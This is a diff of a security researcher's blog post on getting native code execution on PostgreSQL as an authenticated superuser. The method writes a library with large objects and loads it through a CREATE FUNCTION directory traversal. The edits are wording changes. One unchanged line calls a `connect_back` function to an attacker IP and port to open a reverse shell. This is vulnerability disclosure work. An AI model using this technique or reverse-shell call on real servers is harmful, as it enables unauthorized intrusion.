@@ -21,7 +21,7 @@ excerpt_separator: <!--more-->
 
 <p class="cn" markdown="1">Although I didn't know it at the time, [Jacob Wilkin](https://twitter.com/Jacob_Wilkin) had [reported a simpler approach](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5) to achieving code execution against PostgreSQL by (ab)using [copy from program](https://www.postgresql.org/docs/12/sql-copy.html). Recently, Denis Andzakovic also [detailed](https://pulsesecurity.co.nz/articles/postgres-sqli) his way of gaining code execution against PostgreSQL as well by (ab)using read/writes to the `postgresql.conf` file.</p>
 
-<p class="cn" markdown="1">I was planning on sitting this technique, but since Denis exposed the power of `lo_export`, I figured one more nail on the coffin wouldn't hurt ;-></p>
+<p class="cn" markdown="1">I was planning on sitting this technique, but since Denis exposed the power of `lo_export` for exploitation, I figured one more nail on the coffin wouldn't hurt ;-></p>
 
 <p class="cn" markdown="1">I did some testing and discovered that under windows, the NETWORK_SERVICE cannot modify the `postgresql.conf` file, so Denis's technique is *nix specific. However, his technique doesn't require stacked queries, making it powerful in certain contexts.</p>
 
@@ -38,11 +38,11 @@ excerpt_separator: <!--more-->
 
 ### Summary
 
-<p class="cn" markdown="1">On the latest versions of PostgreSQL, the `superuser` is no longer allowed to load a shared library file from anywhere else besides `C:\Program Files\PostgreSQL\11\lib` on Windows or `/var/lib/postgresql/11/lib` on *nix. This path is **not writable** by either the NETWORK_SERVICE  or postgres accounts.</p>
+<p class="cn" markdown="1">On the latest versions of PostgreSQL, the `superuser` is no longer allowed to load a shared library file from anywhere else besides `C:\Program Files\PostgreSQL\11\lib` on Windows or `/var/lib/postgresql/11/lib` on *nix. Additionally, this path is **not writable** by either the NETWORK_SERVICE or postgres accounts.</p>
 
 <p class="cn" markdown="1">However, an authenticated database `superuser` can write binary files to the filesystem using "large objects" and can of course write to the `C:\Program Files\PostgreSQL\11\data` directory. The reason for this should be clear, for updating/creating tables in the database.</p>
 
-<p class="cn" markdown="1">The issue is that the `CREATE FUNCTION` operative allows a directory traversal to the data directory! So essentially, an authenticated attacker can write a shared library file into the data directory and use the traversal to load the shared library. This means an attacker can get native code execution and as such, execute arbitrary code.</p>
+<p class="cn" markdown="1">The underlying issue is that the `CREATE FUNCTION` operative allows for a directory traversal to the data directory! So essentially, an authenticated attacker can write a shared library file into the data directory and use the traversal to load the shared library. This means an attacker can get native code execution and as such, execute arbitrary code.</p>
 
 ### Attack Flow
 
@@ -103,7 +103,7 @@ select connect_back('192.168.100.54', 1234);
 
 ### Fun Facts
 
-<p class="cn" markdown="1">I initially reported this bug to ZDI which later told me that the vendor wasn't patching it. ZDI didn't release an advisory as zeroday because it is considered intended functionality.</p>
+<p class="cn" markdown="1">ZDI initially aquired this case but never published an advisory and I was later told me that the vendor wasn't patching it since its a *feature not a bug*.</p>
 
 ### Automation
 
